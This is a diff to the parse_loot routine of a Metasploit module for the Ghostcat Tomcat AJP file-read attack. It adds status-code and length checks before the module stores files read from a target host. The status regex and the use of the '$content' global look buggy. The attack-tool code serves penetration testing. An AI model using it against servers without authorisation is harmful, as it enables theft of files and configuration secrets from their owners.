@@ -1,6 +1,7 @@
 class MetasploitModule < Msf::Auxiliary
     include Msf::Exploit::Remote::Tcp
     include Msf::Auxiliary::Report
+
     def initialize(info = {})
         super(update_info(info,
             "Name" => "Ghostcat",
@@ -233,14 +234,20 @@ class MetasploitModule < Msf::Auxiliary
         parse_response(buf, idx)
     end
     def parse_loot(content)
+        status_code = $content.match(/Status Code: [0-9]{3}*/).to_s.split(/ /)[2]
         content_type = $content.match(/Content-Type: .*/).to_s.split(/ /)[1]
         content_length = $content.match(/Content-Length: .*/).to_s.split(/ /)[1]
-        data = $content[-(content_length.to_i+1)..]
-        file = store_loot(
-            datastore['FILENAME'].to_s, content_type, datastore['RHOST'].to_s,
-            data, "Ghostcat File Read/Inclusion", "Read file", datastore['FILENAME']
-          )
-        print_good file
+        content_length = content_length.to_i
+        if content_length > 0 and status_code == "200"
+            data = $content[-content_length..$content.length]
+            file = store_loot(
+                datastore['FILENAME'].to_s, content_type, datastore['RHOST'].to_s,
+                data, "Ghostcat File Read/Inclusion", "Read file", datastore['FILENAME']
+            )
+            print_good file
+        else
+            print_error 'Read file error'
+        end
     end
     def run
         headers = Array.new
